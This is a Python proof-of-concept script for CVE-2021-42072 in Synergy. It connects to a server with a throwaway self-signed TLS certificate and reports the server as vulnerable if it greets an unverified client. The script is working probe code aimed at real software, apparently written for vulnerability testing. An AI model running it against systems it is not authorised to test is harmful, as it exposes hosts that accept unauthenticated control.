#!/usr/bin/env python3
"""
CVE-2021-42072 - server does not verify the identity of connecting clients.

Synergy authenticates peers by TLS certificate fingerprint. The server keeps
the fingerprints it trusts in <settingsPath>/tls/trusted-clients and, when
security/checkPeerFingerprints is on, SecureSocket refuses any client whose
certificate is not in that file. Before the fix the server performed no such
check, so any peer that could complete a TLS handshake was accepted as a
legitimate client and could go on to drive the session.

This PoC connects with a freshly generated self-signed certificate, which by
construction the target has never seen. What happens next is the whole test:

  a server that verifies identity drops the connection right after the TLS
  handshake and logs "fingerprint does not match trusted fingerprint"

  a server that does not sends its protocol hello, at which point an unknown
  peer is talking to it as a client, which is the vulnerability

Reaching the hello is therefore proof on its own, and the check needs no
configured screen name on the target.

Note this also catches the equivalent misconfiguration on a patched build,
security/checkPeerFingerprints set to false, because the observable behaviour
and the consequence are identical.

Exit codes: 1 VULNERABLE, 0 PASS, 2 inconclusive.
"""

import argparse
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile

HELLO_NAMES = (b"Synergy", b"Barrier")


def make_throwaway_cert(directory):
    """A self-signed cert the target cannot possibly have in trusted-clients."""
    cert = os.path.join(directory, "poc.crt")
    key = os.path.join(directory, "poc.key")
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
         "-keyout", key, "-out", cert, "-subj", "/CN=synergy-poc"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return cert, key


def read_hello(sock):
    header = sock.recv(4)
    if len(header) < 4:
        return None
    size = struct.unpack(">I", header)[0]
    if size == 0 or size > 4096:
        return None
    body = b""
    while len(body) < size:
        chunk = sock.recv(size - len(body))
        if not chunk:
            break
        body += chunk
    return body


def probe(host, port, cert, key, timeout):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)

    try:
        raw = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        print(f"[ERROR] cannot reach {host}:{port}: {exc}")
        return 2

    try:
        sock = ctx.wrap_socket(raw)
    except ssl.SSLError as exc:
        print(f"[ERROR] tls handshake refused: {exc}")
        print("        the server rejected us before identity could be checked,")
        print("        so this run cannot tell whether the fix is present")
        raw.close()
        return 2
    except OSError as exc:
        print(f"[ERROR] connection lost during tls: {exc}")
        raw.close()
        return 2

    print(f"[*] tls established, offered an untrusted self-signed certificate")
    sock.settimeout(timeout)
    try:
        hello = read_hello(sock)
    except (OSError, ssl.SSLError) as exc:
        print(f"[*] server dropped the connection after tls: {exc}")
        hello = None
    finally:
        sock.close()

    if hello is None:
        print("[PASS] server refused an unverified client after the tls handshake")
        return 0

    if hello.startswith(HELLO_NAMES):
        version = struct.unpack(">hh", hello[7:11]) if len(hello) >= 11 else ("?", "?")
        print(f"[*] server greeted us: {hello[:7].decode()} {version[0]}.{version[1]}")
        print("[FAIL] server accepted a client it has never seen - VULNERABLE (CVE-2021-42072)")
        return 1

    print(f"[*] unexpected reply: {hello!r}")
    print("[ERROR] not a synergy hello, cannot judge")
    return 2


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--cert", help="client certificate to offer (default: generate a throwaway)")
    ap.add_argument("--key", help="private key for --cert")
    args = ap.parse_args()

    print("CVE-2021-42072 - unverified client accepted by the server")
    print(f"target: {args.host}:{args.port}\n")

    if bool(args.cert) != bool(args.key):
        print("[ERROR] --cert and --key must be given together")
        return 2

    if args.cert:
        return probe(args.host, args.port, args.cert, args.key, args.timeout)

    with tempfile.TemporaryDirectory() as tmp:
        try:
            cert, key = make_throwaway_cert(tmp)
        except (OSError, subprocess.CalledProcessError) as exc:
            print(f"[ERROR] could not generate a certificate with openssl: {exc}")
            print("        pass --cert and --key instead")
            return 2
        return probe(args.host, args.port, cert, key, args.timeout)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
